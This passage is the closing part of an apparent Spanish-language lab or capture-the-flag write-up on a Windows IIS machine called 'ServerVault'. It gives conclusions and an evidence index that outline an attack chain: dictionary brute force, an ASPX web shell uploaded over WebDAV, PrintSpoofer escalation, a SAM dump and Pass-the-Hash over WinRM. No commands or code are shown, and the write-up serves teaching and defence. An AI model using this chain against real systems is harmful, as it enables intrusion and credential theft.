evidencia/05-brute-medusa.png
evidencia/06-brute-ncrack.png
evidencia/07-brute-nmap.png
evidencia/08-brute-ffuf.png
evidencia/09-brute-wget.png
evidencia/10-brute-cadaver.png
evidencia/11-creds-validated.png
evidencia/12-webshell-upload.png
evidencia/13-privileges.png
evidencia/14-printspoofer.png
evidencia/15-flag.png
evidencia/16-sam-dump.png
evidencia/17-secretsdump.png
evidencia/18-pth-winrm.png
```

---

## 13. Conclusiones

ServerVault encadena fallos de configuración que, por separado, ya serían graves: una contraseña de diccionario, Basic Auth sobre HTTP, WebDAV con escritura y ejecución de `.aspx`, un app pool con `SeImpersonatePrivilege` y Print Spooler activo. La combinación permite pasar de una credencial débil a `NT AUTHORITY\SYSTEM` en pocos minutos.

El volcado en vivo de `SAM`/`SYSTEM` demuestra el impacto posterior a la escalada: el hash de `Administrator` habilita Pass-the-Hash por WinRM y un acceso administrativo remoto sin contraseña en claro. La lección principal es que la segmentación de privilegios del app pool y la limpieza de la superficie WebDAV no son opcionales: cualquiera de las dos mitigaciones habría roto la cadena.

---

## Anexo A. Índice de evidencia

| # | Imagen | Fase |
|---|---|---|
| 01 | `evidencia/01-recon-nmap-full.png` | Escaneo completo de puertos |
| 02 | `evidencia/02-recon-nmap-services.png` | Detección de servicios y WebDAV |
| 03 | `evidencia/03-webdav-enum.png` | Enumeración WebDAV y `/storage/` |
| 04 | `evidencia/04-brute-hydra.png` | Hydra sobre `rockyou.txt` |
| 05 | `evidencia/05-brute-medusa.png` | Medusa sobre `rockyou.txt` |
| 06 | `evidencia/06-brute-ncrack.png` | Ncrack sobre `rockyou.txt` |
| 07 | `evidencia/07-brute-nmap.png` | Nmap `http-brute` |
| 08 | `evidencia/08-brute-ffuf.png` | ffuf con lista de 610 entradas |
| 09 | `evidencia/09-brute-wget.png` | Wget, intento 610 |
| 10 | `evidencia/10-brute-cadaver.png` | Cadaver y escritura WebDAV |
| 11 | `evidencia/11-creds-validated.png` | Validación `200` vs `401` |
| 12 | `evidencia/12-webshell-upload.png` | Subida de `shell.aspx` y RCE |
| 13 | `evidencia/13-privileges.png` | `whoami /priv` |
| 14 | `evidencia/14-printspoofer.png` | Escalada con PrintSpoofer |
| 15 | `evidencia/15-flag.png` | Lectura de la flag |
| 16 | `evidencia/16-sam-dump.png` | Volcado en vivo de SAM/SYSTEM |
| 17 | `evidencia/17-secretsdump.png` | Extracción de hashes |
| 18 | `evidencia/18-pth-winrm.png` | Pass-the-Hash por WinRM |
